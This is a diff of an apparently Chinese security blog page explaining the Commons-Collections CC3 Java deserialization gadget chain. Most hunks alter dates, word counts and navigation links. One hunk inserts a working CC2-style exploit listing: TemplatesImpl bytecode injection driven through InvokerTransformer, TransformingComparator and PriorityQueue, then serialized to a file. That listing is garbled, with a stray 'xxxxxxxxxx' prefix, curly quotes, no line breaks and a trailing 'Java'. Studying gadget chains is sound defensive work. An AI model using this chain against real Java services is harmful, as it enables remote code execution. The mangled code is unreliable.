@@ -290,7 +290,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2024-11-11
+                    2024-09-16
                 </div>
                 
 
@@ -299,14 +299,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    1.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    7 分
                 </div>
                 
 
@@ -495,7 +495,7 @@
 </code></pre>
 
 <p><img src="/images/posts/Commons-CollectionCC3%E9%93%BE/1726472172428.jpg"></p>
-<h1 id="另一条条链子"><a href="#另一条条链子" class="headerlink" title="另一条条链子"></a>另一条条链子</h1><p><img src="/images/posts/Commons-CollectionCC3%E9%93%BE/1726474429642.jpg"></p>
+<h1 id="另一条条链子"><a href="#另一条条链子" class="headerlink" title="另一条条链子"></a>另一条条链子</h1><p>xxxxxxxxxx package org.example;​import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;​public class CC2 {    public static void main(String[] args) throws Exception{        TemplatesImpl templates &#x3D; new  TemplatesImpl();        Class c &#x3D; templates.getClass();        Field nameField &#x3D; c.getDeclaredField(“_name”);        nameField.setAccessible(true);        nameField.set(templates,”admin”);​        Field bytecodeField &#x3D; c.getDeclaredField(“_bytecodes”);        bytecodeField.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(“D:\桌面\note\ClassLoaderTest.class\“));        byte[][] codes &#x3D; {code};        bytecodeField.set(templates,codes);​        InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer&lt;&gt;(“newTransformer”, new Class[]{}, new Object[]{});​​        TransformingComparator transformingComparator &#x3D; new TransformingComparator(new ConstantTransformer&lt;&gt;(1));        PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(transformingComparator);​        priorityQueue.add(templates);        priorityQueue.add(2);​        Class transformingComparatorClass &#x3D; transformingComparator.getClass();        Field declaredField &#x3D; transformingComparatorClass.getDeclaredField(“transformer”);        declaredField.setAccessible(true);        declaredField.set(transformingComparator,invokerTransformer);​​        serialize(priorityQueue);&#x2F;&#x2F;        unserialize(“CCTest1.txt”);​    }    public static void serialize(Object obj) throws IOException {        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(“CCTest1.txt”));        oos.writeObject(obj);    }​    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; ois.readObject();        return obj;    }}Java</p>
 <p>这里找到了<code>TrAXFilter</code>类，并且调用了<code>newTransformer</code>方法，但是<code>TrAXFilter</code>不能序列化，只有找一个能被序列化的对象来调用这个构造器。这里找到了<code>InstantiateTransformer</code>的<code>transform</code>方法</p>
 <p><img src="/images/posts/Commons-CollectionCC3%E9%93%BE/1726474863076.jpg"></p>
 <h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC3</span> <span class="token punctuation">&#123;</span>
@@ -673,13 +673,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/Commons-Collection%20CC4%E9%93%BE2%E9%93%BE/">
+                <a href="/Commons-Collection%20CC1%E9%93%BE/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="Commons-Collection CC4链2链">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="Commons-Collection CC1链">
                         
-                        <span class="card-title">Commons-Collection CC4链2链</span>
+                        <span class="card-title">Commons-Collection CC1链</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -690,7 +690,7 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2024-11-11
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-09-16
                         </span>
                         <span class="publish-author">
                             
@@ -722,13 +722,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/Commons-Collection%20CC1%E9%93%BE/">
+                <a href="/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="Commons-Collection CC1链">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="Linux提权(escalate_linux_1靶机)">
                         
-                        <span class="card-title">Commons-Collection CC1链</span>
+                        <span class="card-title">Linux提权(escalate_linux_1靶机)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -739,14 +739,14 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-11-11
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-09-15
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
-                                    代码审计
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
                                 </a>
                             
                             
@@ -756,8 +756,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Java/">
-                        <span class="chip bg-color">Java</span>
+                    <a href="/tags/%E6%8F%90%E6%9D%83/">
+                        <span class="chip bg-color">提权</span>
                     </a>
                     
                 </div>
@@ -953,7 +953,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">49.5k</span>
+                        class="white-color">49.7k</span>
             
             
             
